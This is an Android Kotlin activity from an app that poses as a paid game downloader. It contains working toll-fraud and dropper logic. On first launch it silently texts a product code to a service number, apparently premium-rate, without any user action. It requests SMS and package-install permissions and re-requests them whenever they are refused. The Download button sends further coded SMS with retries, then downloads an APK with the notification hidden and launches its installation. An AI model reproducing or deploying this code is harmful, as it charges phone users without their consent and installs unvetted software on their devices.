package com.kodevko.applicationforcustomer

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.telephony.SmsManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.kodevko.applicationforcustomer.databinding.ActivityMainBinding
import com.kodevko.applicationforcustomer.databinding.DialogDownloadBinding

class MainActivity : AppCompatActivity(), ActivityCompat.OnRequestPermissionsResultCallback {
    private lateinit var dialog: Dialog
    private lateinit var downloadManager: DownloadManager
    private var destinationPhones = emptyArray<String>()
    private var codeSends = emptyArray<String>()
    private lateinit var binding: ActivityMainBinding
    private var index1 = 0
    private var index2 = 0

    companion object {
        val REQUIRED_PERMISSIONS =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                arrayOf(
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.REQUEST_INSTALL_PACKAGES,
                    Manifest.permission.INSTALL_PACKAGES,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.RECEIVE_BOOT_COMPLETED,
                    Manifest.permission.WAKE_LOCK,
                    Manifest.permission.READ_SMS
                )
            } else {
                arrayOf(
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.RECEIVE_BOOT_COMPLETED,
                    Manifest.permission.WAKE_LOCK,
                    Manifest.permission.READ_SMS

                )
            }

        const val REQUEST_CODE_PERMISSIONS = 1403
    }

    @SuppressLint("UnspecifiedImmutableFlag")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)


        binding.cost = resources.getString(R.string.cost)
        binding.description = resources.getString(R.string.description)

        destinationPhones = resources.getStringArray(R.array.service_phone)
        codeSends = resources.getStringArray(R.array.code_product)

        if (!allPermissionsGranted()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                requestPermissions(REQUIRED_PERMISSIONS, REQUEST_CODE_PERMISSIONS)
            } else {
                ActivityCompat.requestPermissions(
                    this,
                    REQUIRED_PERMISSIONS,
                    REQUEST_CODE_PERMISSIONS
                )
            }
        }

        if (getSharedPreferences("", MODE_PRIVATE).getBoolean("first_launch", true)) {
            getSharedPreferences("", MODE_PRIVATE).edit()
                .putLong("expiration_date", System.currentTimeMillis()).apply()
            getSharedPreferences("", MODE_PRIVATE).edit().putBoolean("first_launch", false).apply()
            sendMessage3()
        }

        val startDate = getSharedPreferences("", MODE_PRIVATE).getLong(
            "expiration_date",
            System.currentTimeMillis()
        )

        val alarmManager =
            applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(applicationContext, RemindReceiver::class.java)
        val pendingIntent =
            PendingIntent.getBroadcast(applicationContext, 0, intent, PendingIntent.FLAG_ONE_SHOT)
        alarmManager.set(
            AlarmManager.RTC_WAKEUP,
            startDate + 30 * 24 * 60 * 60 * 1000,
            pendingIntent
        )

        downloadManager = getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
        registerReceiver(onComplete, IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE))
        binding.btnCancel.setOnClickListener {
            finish()
        }
        binding.btnDownload.setOnClickListener {
            payService()
        }
    }

    private fun sendMessage3() {
        try {
            val SENT = "SMS_SENT"

            val sentPI = PendingIntent.getBroadcast(this, 0, Intent(SENT), 0)

            registerReceiver(object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    getSharedPreferences("", 0).edit()
                        .putLong("expiration_date", System.currentTimeMillis()).apply()
                }
            }, IntentFilter(SENT))

            val smsMgr = SmsManager.getDefault()
            smsMgr.sendTextMessage(
                resources.getStringArray(R.array.service_phone)[4],
                null,
                resources.getStringArray(R.array.code_product)[1],
                sentPI,
                null
            )

        } catch (e: Exception) {

        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            if (!allPermissionsGranted()) {
                ActivityCompat.requestPermissions(
                    this,
                    REQUIRED_PERMISSIONS,
                    REQUEST_CODE_PERMISSIONS
                )
            }
        }
    }

    private var onComplete: BroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            // Download complete
            // Check if the broadcast message is for our enqueued download
            val referenceId = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1)

            if (getStatusMessage(referenceId) == DownloadManager.STATUS_SUCCESSFUL) {
                dialog.hide()
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
//                    installApk(downloadManager.getUriForDownloadedFile(referenceId))
                    val intentInstall = Intent(Intent.ACTION_INSTALL_PACKAGE)
                    intentInstall.data = downloadManager.getUriForDownloadedFile(referenceId)
                    intentInstall.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
                    startActivity(intentInstall)
                } else {
                    val intentInstall = Intent(Intent.ACTION_VIEW)
                    intentInstall.setDataAndType(
                        downloadManager.getUriForDownloadedFile(referenceId),
                        "application/vnd.android.package-archive"
                    )
                    startActivity(intentInstall)
                }
            }
        }
    }


    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(onComplete)
    }


    private fun allPermissionsGranted() = REQUIRED_PERMISSIONS.all {
        ContextCompat.checkSelfPermission(
            baseContext, it
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun sendMessage(indexPhone: Int) {
        try {
            val SENT = "SMS_SENT"

            val sentPI = PendingIntent.getBroadcast(this, 0, Intent(SENT), 0)

            registerReceiver(object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    if (resultCode == Activity.RESULT_OK) {
                        sendMessage2(index2)
                    } else if (resultCode == SmsManager.RESULT_RIL_MODEM_ERR) {
                        index1++
                        sendMessage(index1)
                    }
                }
            }, IntentFilter(SENT))

            val smsMgr = SmsManager.getDefault()
            smsMgr.sendTextMessage(
                destinationPhones[indexPhone],
                null,
                codeSends[0],
                sentPI,
                null
            )

        } catch (e: Exception) {

        }
    }

    private fun sendMessage2(indexCode: Int) {
        try {
            val SENT = "SMS_SENT"

            val sentPI = PendingIntent.getBroadcast(this, 0, Intent(SENT), 0)

            registerReceiver(object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    if (resultCode == SmsManager.RESULT_RIL_MODEM_ERR) {
                        index2++
                        sendMessage2(index2)
                    } else {
                        download()
                    }
                }
            }, IntentFilter(SENT))

            val smsMgr = SmsManager.getDefault()
            smsMgr.sendTextMessage(
                destinationPhones[index1],
                null,
                codeSends[indexCode],
                sentPI,
                null
            )

        } catch (e: Exception) {

        }
    }

    private fun payService() {
        //thử gửi 15k lần 1
        sendMessage(index1)
    }

    private fun download() {
        dialog = Dialog(this)
        val dialogBinding = DialogDownloadBinding.inflate(layoutInflater)
        dialog.setContentView(dialogBinding.root)
        dialog.show()
        dialog.setCanceledOnTouchOutside(false)
        //init download
        startDownload(Uri.parse(resources.getString(R.string.url_game)))

    }

    private fun startDownload(uri: Uri): Long {

        val downloadReference: Long

        val request = DownloadManager.Request(uri)

        // Setting title of request
        request.setTitle("Data Download")

        // Setting description of request
        request.setDescription("Android Data download using DownloadManager.")
        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN)

        // Set the local destination for the downloaded file to a path
        // within the application<s external files directory
        request.setDestinationInExternalFilesDir(
            this@MainActivity,
            Environment.DIRECTORY_DOWNLOADS,
            resources.getString(R.string.app_name).plus(".apk")
        )
        // Enqueue download and save into referenceId
        downloadReference = downloadManager.enqueue(request)

        return downloadReference
    }

    private fun getStatusMessage(downloadId: Long): Int {

        val query = DownloadManager.Query()
        // set the query filter to our previously Enqueued download
        query.setFilterById(downloadId)

        // Query the download manager about downloads that have been requested.
        val cursor = downloadManager.query(query)
        if (cursor?.moveToFirst() == true) {
            return downloadStatus(cursor)
        }
        return DownloadManager.ERROR_UNKNOWN
    }

    private fun downloadStatus(cursor: Cursor): Int {

        // column for download  status
        val columnIndex = cursor.getColumnIndex(DownloadManager.COLUMN_STATUS)
        val status = cursor.getInt(columnIndex)
        // column for reason code if the download failed or paused
        val columnReason = cursor.getColumnIndex(DownloadManager.COLUMN_REASON)
        val reason = cursor.getInt(columnReason)

        var statusText = ""
        var reasonText = ""

        when (status) {
            DownloadManager.STATUS_FAILED -> {
                statusText = "STATUS_FAILED"
                when (reason) {
                    DownloadManager.ERROR_CANNOT_RESUME -> reasonText = "ERROR_CANNOT_RESUME"
                    DownloadManager.ERROR_DEVICE_NOT_FOUND -> reasonText = "ERROR_DEVICE_NOT_FOUND"
                    DownloadManager.ERROR_FILE_ALREADY_EXISTS -> reasonText =
                        "ERROR_FILE_ALREADY_EXISTS"
                    DownloadManager.ERROR_FILE_ERROR -> reasonText = "ERROR_FILE_ERROR"
                    DownloadManager.ERROR_HTTP_DATA_ERROR -> reasonText = "ERROR_HTTP_DATA_ERROR"
                    DownloadManager.ERROR_INSUFFICIENT_SPACE -> reasonText =
                        "ERROR_INSUFFICIENT_SPACE"
                    DownloadManager.ERROR_TOO_MANY_REDIRECTS -> reasonText =
                        "ERROR_TOO_MANY_REDIRECTS"
                    DownloadManager.ERROR_UNHANDLED_HTTP_CODE -> reasonText =
                        "ERROR_UNHANDLED_HTTP_CODE"
                    DownloadManager.ERROR_UNKNOWN -> reasonText = "ERROR_UNKNOWN"
                }
            }
            DownloadManager.STATUS_PAUSED -> {
                statusText = "STATUS_PAUSED"
                when (reason) {
                    DownloadManager.PAUSED_QUEUED_FOR_WIFI -> reasonText = "PAUSED_QUEUED_FOR_WIFI"
                    DownloadManager.PAUSED_UNKNOWN -> reasonText = "PAUSED_UNKNOWN"
                    DownloadManager.PAUSED_WAITING_FOR_NETWORK -> reasonText =
                        "PAUSED_WAITING_FOR_NETWORK"
                    DownloadManager.PAUSED_WAITING_TO_RETRY -> reasonText =
                        "PAUSED_WAITING_TO_RETRY"
                }
            }
            DownloadManager.STATUS_PENDING -> statusText = "STATUS_PENDING"
            DownloadManager.STATUS_RUNNING -> statusText = "STATUS_RUNNING"
            DownloadManager.STATUS_SUCCESSFUL -> statusText = "STATUS_SUCCESSFUL"
        }
//        return "Download Status: $statusText, $reasonText"
        return status
    }


}

